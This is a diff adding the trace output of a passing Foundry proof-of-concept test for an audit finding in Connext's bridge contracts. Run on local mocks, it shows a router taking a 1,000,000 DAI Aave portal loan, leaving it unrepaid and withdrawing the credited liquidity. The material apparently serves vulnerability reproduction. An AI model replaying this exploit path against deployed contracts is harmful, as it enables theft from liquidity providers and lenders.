@@ -1,0 +1,210 @@
+No files changed, compilation skipped
+warning: invalid natspec tag '@property', custom tags must use format '@custom:name'
+  --> src/connext/core/connext/libraries/LibConnextStorage.sol:20:1
+   |
+20 | / /**
+21 | |  * @notice These are the call parameters that will remain constant between the
+22 | |  * two chains. They are supplied on `xcall` and should be asserted on `execute`
+23 | |  * @property to - The account that receives funds, in the event of a crosschain call,
+...  |
+36 | |  * @param slippageTol - Max bps of original due to slippage (i.e. would be 9995 to tolerate .05% slippage)
+37 | |  */
+   | |___^
+
+
+Ran 1 test for test/25134-h-05-routers-are-not-enforced-to-repay-aave-portal-loan-code_exp.sol:PoC_25134
+[PASS] test_router_takes_aave_portal_loan_and_never_repays() (gas: 434346)
+Logs:
+  Router stole (DAI)          : 1000000.000000000000000000
+  Connext debt to Aave (DAI)  : 1000000.000000000000000000
+
+Traces:
+  [9929527] PoC_25134::setUp()
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0x57785792520e29CdB0945B21bB75AF26F284E58d
+    ├─ [7187241] → new ConnextPortalHarness@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 35890 bytes of code
+    ├─ [1436899] → new TokenRegistry@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 7177 bytes of code
+    ├─ [22450] TokenRegistry::setLocalDomain(1735353714 [1.735e9])
+    │   └─ ← [Stop]
+    ├─ [233275] → new MockAavePortal@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   └─ ← [Return] 1165 bytes of code
+    ├─ [512854] → new MockDai@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   └─ ← [Return] 2336 bytes of code
+    ├─ [202478] ConnextPortalHarness::seed(TokenRegistry: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 0x57785792520e29CdB0945B21bB75AF26F284E58d, 0x0000000000000000000000000000000000000B0b, MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 0x0000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a9)
+    │   └─ ← [Stop]
+    ├─ [46600] MockDai::mint(MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 1000000000000000000000000 [1e24])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 1000000000000000000000000 [1e24])
+    │   └─ ← [Stop]
+    ├─ [24700] MockDai::mint(ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000 [1e24])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000 [1e24])
+    │   └─ ← [Stop]
+    ├─ [2489] MockAavePortal::setRepayEnabled(false)
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+  [506446] PoC_25134::test_router_takes_aave_portal_loan_and_never_repays()
+    ├─ [0] VM::sign("<pk>", 0xd1f913f7eead707e46cce8fe18e0d6e94bc6f2e3f7b44acbd2811e91ae69bdd8) [staticcall]
+    │   └─ ← [Return] 27, 0x5ed453be5d0904191de9e3480d0dcafd9ba517c141feb5d70c4b4ec9d999bc65, 0x3cbc47cca4f54523b6f538683f34521ab5aa7abc7113c0ffae3eaa580e98928f
+    ├─ [0] VM::prank(0x0000000000000000000000000000000000000e0A)
+    │   └─ ← [Return]
+    ├─ [254095] ConnextPortalHarness::execute(ExecuteArgs({ params: CallParams({ to: 0x00000000000000000000000000000000000a71CE, callData: 0x, originDomain: 6648936 [6.648e6], destinationDomain: 1735353714 [1.735e9], agent: 0x0000000000000000000000000000000000000e0A, recovery: 0x00000000000000000000000000000000000a71CE, callback: 0x0000000000000000000000000000000000000000, callbackFee: 0, relayerFee: 0, forceSlow: false, receiveLocal: false, slippageTol: 10000 [1e4] }), local: 0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9, routers: [0x57785792520e29CdB0945B21bB75AF26F284E58d], routerSignatures: [0x5ed453be5d0904191de9e3480d0dcafd9ba517c141feb5d70c4b4ec9d999bc653cbc47cca4f54523b6f538683f34521ab5aa7abc7113c0ffae3eaa580e98928f1b], amount: 1000000000000000000000000 [1e24], nonce: 0, originSender: 0x0000000000000000000000000000000000005eed }))
+    │   ├─ [7062] TokenRegistry::getTokenId(MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   └─ ← [Return] 1735353714 [1.735e9], 0x0000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a9
+    │   ├─ [3000] PRECOMPILES::ecrecover(0xd1f913f7eead707e46cce8fe18e0d6e94bc6f2e3f7b44acbd2811e91ae69bdd8, 27, 42892557321694460456223039629995294806777474323787433990991791396947393887333, 27471433704366175875809567076107037583617837517478976118692893303714017219215) [staticcall]
+    │   │   └─ ← [Return] 0x57785792520e29CdB0945B21bB75AF26F284E58d
+    │   ├─ [1062] TokenRegistry::getTokenId(MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   └─ ← [Return] 1735353714 [1.735e9], 0x0000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a9
+    │   ├─ [22819] MockAavePortal::mintUnbacked(MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000000 [1e24], ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x6aabb5e3159f63e459180f984db14c38dd83524ae5f05f37086f1b3a53e50715: 0 → 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+    │   │   └─ ← [Stop]
+    │   ├─ [16218] MockAavePortal::withdraw(MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000000 [1e24], ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─ [12734] MockDai::transfer(ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000000 [1e24])
+    │   │   │   ├─ emit Transfer(from: MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000000000 [1e24])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xb3024e141922907eb80bf787d622b0c592108908135c35e38e6ebb7d5636f1e4: 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000 → 0
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000 → 0x00000000000000000000000000000000000000000001a784379d99db42000000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    │   ├─ emit AavePortalMintUnbacked(transferId: 0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b, router: 0x57785792520e29CdB0945B21bB75AF26F284E58d, asset: MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 1000000000000000000000000 [1e24])
+    │   ├─ [25034] MockDai::transfer(0x00000000000000000000000000000000000a71CE, 1000000000000000000000000 [1e24])
+    │   │   ├─ emit Transfer(from: ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x00000000000000000000000000000000000a71CE, value: 1000000000000000000000000 [1e24])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x9957b2dddab589dd1a5a8d2f0576610eab743eeb619f33f95b7ebd77e85bc65d: 0 → 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+    │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000001a784379d99db42000000 → 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+    │   │   └─ ← [Return] true
+    │   ├─ emit Executed(transferId: 0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b, to: 0x00000000000000000000000000000000000a71CE, args: ExecuteArgs({ params: CallParams({ to: 0x00000000000000000000000000000000000a71CE, callData: 0x, originDomain: 6648936 [6.648e6], destinationDomain: 1735353714 [1.735e9], agent: 0x0000000000000000000000000000000000000e0A, recovery: 0x00000000000000000000000000000000000a71CE, callback: 0x0000000000000000000000000000000000000000, callbackFee: 0, relayerFee: 0, forceSlow: false, receiveLocal: false, slippageTol: 10000 [1e4] }), local: 0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9, routers: [0x57785792520e29CdB0945B21bB75AF26F284E58d], routerSignatures: [0x5ed453be5d0904191de9e3480d0dcafd9ba517c141feb5d70c4b4ec9d999bc653cbc47cca4f54523b6f538683f34521ab5aa7abc7113c0ffae3eaa580e98928f1b], amount: 1000000000000000000000000 [1e24], nonce: 0, originSender: 0x0000000000000000000000000000000000005eed }), transactingAsset: MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], transactingAmount: 1000000000000000000000000 [1e24], caller: 0x0000000000000000000000000000000000000e0A)
+    │   ├─  storage changes:
+    │   │   @ 0xb0790c6fc031afd659e3b24023d08e2dcd0b15e8279a48242211d44c7809afba: 0 → 3594
+    │   │   @ 0x6ac7fc589d7e8894499749495a7e794218ff7633d9a5bc7f3d7807b18dc93e55: 0 → 0x00000000000000000000000057785792520e29cdb0945b21bb75af26f284e58d
+    │   │   @ 36: 0 → 1
+    │   │   @ 0x217232f5f9709e5ab837dc972f738940075856acfccd0b6b56bc0b0be776c1d2: 0 → 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+    │   │   @ 0x1d4ea6d768894895795f2fd69bff75b733215b84d8ab626c3dbb3c963fb8eac3: 0 → 1
+    │   └─ ← [Return] 0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b
+    ├─ [0] VM::assertEq(0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b, 0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b, "transferId mismatch") [staticcall]
+    │   └─ ← [Return]
+    ├─ [562] MockDai::balanceOf(0x00000000000000000000000000000000000a71CE) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "user did not receive fast-transfer funds") [staticcall]
+    │   └─ ← [Return]
+    ├─ [573] ConnextPortalHarness::getAavePortalDebt(0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "portal debt not recorded") [staticcall]
+    │   └─ ← [Return]
+    ├─ [588] MockAavePortal::unbacked(MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "aave unbacked not recorded") [staticcall]
+    │   └─ ← [Return]
+    ├─ [562] MockDai::balanceOf(MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "aave should have lent its reserve") [staticcall]
+    │   └─ ← [Return]
+    ├─ [823] ConnextPortalHarness::routerBalances(0x57785792520e29CdB0945B21bB75AF26F284E58d, MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "router not yet credited") [staticcall]
+    │   └─ ← [Return]
+    ├─ [562] MockDai::balanceOf(ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "escrow should remain in diamond") [staticcall]
+    │   └─ ← [Return]
+    ├─ [6690] ConnextPortalHarness::buildTransferMessage(1735353714 [1.735e9], 0x0000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a9, 0x00000000000000000000000000000000000000000000000000000000000a71ce, 1000000000000000000000000 [1e24], 0x0000000000000000000000000000000000000000000000000000000000000000, 0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b) [staticcall]
+    │   ├─ [21] PRECOMPILES::identity(0x676f65720000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a9) [staticcall]
+    │   │   └─ ← [Return] 0x676f65720000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a9
+    │   ├─ [30] PRECOMPILES::identity(0x0300000000000000000000000000000000000000000000000000000000000a71ce00000000000000000000000000000000000000000000d3c21bcecceda100000000000000000000000000000000000000000000000000000000000000000000007d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b) [staticcall]
+    │   │   └─ ← [Return] 0x0300000000000000000000000000000000000000000000000000000000000a71ce00000000000000000000000000000000000000000000d3c21bcecceda100000000000000000000000000000000000000000000000000000000000000000000007d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b
+    │   └─ ← [Return] 0x676f65720000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a90300000000000000000000000000000000000000000000000000000000000a71ce00000000000000000000000000000000000000000000d3c21bcecceda100000000000000000000000000000000000000000000000000000000000000000000007d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b
+    ├─ [121910] ConnextPortalHarness::reconcileExposed(6648936 [6.648e6], 0x676f65720000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a90300000000000000000000000000000000000000000000000000000000000a71ce00000000000000000000000000000000000000000000d3c21bcecceda100000000000000000000000000000000000000000000000000000000000000000000007d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b)
+    │   ├─ [746] TokenRegistry::ensureLocalToken(1735353714 [1.735e9], 0x0000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a9)
+    │   │   └─ ← [Return] MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]
+    │   ├─ [738] TokenRegistry::isLocalOrigin(MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   └─ ← [Return] true
+    │   ├─ [1062] TokenRegistry::getTokenId(MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   └─ ← [Return] 1735353714 [1.735e9], 0x0000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a9
+    │   ├─ [1062] TokenRegistry::getTokenId(MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   └─ ← [Return] 1735353714 [1.735e9], 0x0000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a9
+    │   ├─ [2848] MockDai::allowance(ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [22524] MockDai::approve(MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 1000000000000000000000000 [1e24])
+    │   │   ├─ emit Approval(owner: ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 1000000000000000000000000 [1e24])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x503fcb3e55db53f75a0efdcaa9981971b913d6cdb99383f56f2be38e24484dcb: 0 → 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+    │   │   └─ ← [Return] true
+    │   ├─ [2673] MockAavePortal::backUnbacked(MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000000 [1e24], 0)
+    │   │   └─ ← [Revert] AAVE_PORTAL: backUnbacked reverted
+    │   ├─ [848] MockDai::allowance(ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
+    │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    │   ├─ [2624] MockDai::approve(MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 0)
+    │   │   ├─ emit Approval(owner: ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x503fcb3e55db53f75a0efdcaa9981971b913d6cdb99383f56f2be38e24484dcb: 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000 → 0
+    │   │   └─ ← [Return] true
+    │   ├─ emit AavePortalRepaymentDebt(transferId: 0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b, asset: MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 1000000000000000000000000 [1e24], fee: 0)
+    │   ├─ emit Reconciled(transferId: 0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b, origin: 6648936 [6.648e6], routers: [0x57785792520e29CdB0945B21bB75AF26F284E58d], asset: MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 1000000000000000000000000 [1e24], caller: PoC_25134: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 0x106dd3642520a4282514837fc548edd0c5cb7593c9542da2ca56fcc215dc02db: 0 → 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+    │   │   @ 0xe5d0618e51392443cdc225cb7bd5f6f4a7eae9dfb50c1e8031351ff5a9356d21: 0 → 1
+    │   └─ ← [Stop]
+    ├─ [823] ConnextPortalHarness::routerBalances(0x57785792520e29CdB0945B21bB75AF26F284E58d, MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "router not credited full amount") [staticcall]
+    │   └─ ← [Return]
+    ├─ [573] ConnextPortalHarness::getAavePortalDebt(0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "portal debt should remain unpaid") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(0x0000000000000000000000000000000000000B0b)
+    │   └─ ← [Return]
+    ├─ [38276] ConnextPortalHarness::removeRouterLiquidityFor(1000000000000000000000000 [1e24], MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 0x000000000000000000000000000000000000F00D, 0x57785792520e29CdB0945B21bB75AF26F284E58d)
+    │   ├─ [27834] MockDai::transfer(0x000000000000000000000000000000000000F00D, 1000000000000000000000000 [1e24])
+    │   │   ├─ emit Transfer(from: ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x000000000000000000000000000000000000F00D, value: 1000000000000000000000000 [1e24])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x66865bbaecb3e36dc9b5691a8d280ab0571bd0452cda1849b04b06e5dce9cdc6: 0 → 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+    │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000 → 0
+    │   │   └─ ← [Return] true
+    │   ├─ emit RouterLiquidityRemoved(router: 0x57785792520e29CdB0945B21bB75AF26F284E58d, to: 0x000000000000000000000000000000000000F00D, local: MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 1000000000000000000000000 [1e24], caller: 0x0000000000000000000000000000000000000B0b)
+    │   ├─  storage changes:
+    │   │   @ 0x106dd3642520a4282514837fc548edd0c5cb7593c9542da2ca56fcc215dc02db: 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000 → 0
+    │   └─ ← [Stop]
+    ├─ [562] MockDai::balanceOf(0x000000000000000000000000000000000000F00D) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "router did not extract the loan") [staticcall]
+    │   └─ ← [Return]
+    ├─ [573] ConnextPortalHarness::getAavePortalDebt(0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "debt vanished unexpectedly") [staticcall]
+    │   └─ ← [Return]
+    ├─ [588] MockAavePortal::unbacked(MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "aave still unbacked") [staticcall]
+    │   └─ ← [Return]
+    ├─ [562] MockDai::balanceOf(MockAavePortal: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "aave reserve not drained") [staticcall]
+    │   └─ ← [Return]
+    ├─ [562] MockDai::balanceOf(ConnextPortalHarness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "diamond escrow drained by router") [staticcall]
+    │   └─ ← [Return]
+    ├─ [823] ConnextPortalHarness::routerBalances(0x57785792520e29CdB0945B21bB75AF26F284E58d, MockDai: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "router balance not spent") [staticcall]
+    │   └─ ← [Return]
+    ├─ [562] MockDai::balanceOf(0x00000000000000000000000000000000000a71CE) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "user balance changed") [staticcall]
+    │   └─ ← [Return]
+    ├─ [562] MockDai::balanceOf(0x000000000000000000000000000000000000F00D) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ emit log_named_decimal_uint(key: "Router stole (DAI)          ", val: 1000000000000000000000000 [1e24], decimals: 18)
+    ├─ [573] ConnextPortalHarness::getAavePortalDebt(0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ emit log_named_decimal_uint(key: "Connext debt to Aave (DAI)  ", val: 1000000000000000000000000 [1e24], decimals: 18)
+    ├─  storage changes:
+    │   @ 37: 0 → 0x7d7856915dc56e3980e9af610926cb13879f8f1df2f02f007421d28cf4af931b
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.75ms (8.20ms CPU time)
+
+Ran 1 test suite in 133.86ms (11.75ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
